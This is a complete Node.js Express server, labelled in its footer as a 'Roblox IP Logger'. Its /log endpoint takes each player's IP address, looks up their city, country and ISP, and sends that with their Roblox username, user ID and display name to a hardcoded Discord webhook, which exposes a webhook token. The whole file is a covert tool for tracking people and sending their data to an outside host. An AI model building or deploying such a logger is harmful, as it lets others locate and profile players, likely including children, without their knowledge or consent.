const express = require('express');
const axios = require('axios');
const app = express();

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1469544408444567766/3PcIRNOpYQ8bsYJECwwDXK6H24Aoe6VpidxaURUv6ThwVkke3IgcnKdZPDIenEBKbMgi';

app.get('/log', async (req, res) => {
    let ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    const { username, userId, displayName, placeId } = req.query;

    let geoData = { isp: "Unknown", country: "Unknown" };
    try {
        const geoResponse = await axios.get(`http://ip-api.com/json/${ip}`);
        if(geoResponse.data.status === 'success') {
            geoData = geoResponse.data;
        }
    } catch (e) {}

    const embed = {
        embeds: [{
            title: "New Player Joined (Verified)",
            color: 2329855,
            fields: [
                { name: "Username", value: username || "N/A", inline: true },
                { name: "User ID", value: userId || "N/A", inline: true },
                { name: "Display Name", value: displayName || "N/A", inline: true },
                { name: "IP Address", value: `\`${ip}\``, inline: true },
                { name: "Location", value: `${geoData.city || 'N/A'}, ${geoData.country || 'N/A'}`, inline: true },
                { name: "ISP", value: geoData.isp || "N/A", inline: true },
                { name: "Join Time", value: new Date().toISOString().replace('T', ' ').slice(0, 19) + " UTC", inline: false },
                { name: "Place ID", value: placeId || "N/A", inline: false }
            ],
            footer: { text: "Roblox IP Logger • Accurate Mode Active" }
        }]
    };

    await axios.post(WEBHOOK_URL, embed);
    res.status(200).send("Verified");
});

app.listen(process.env.PORT || 3000);
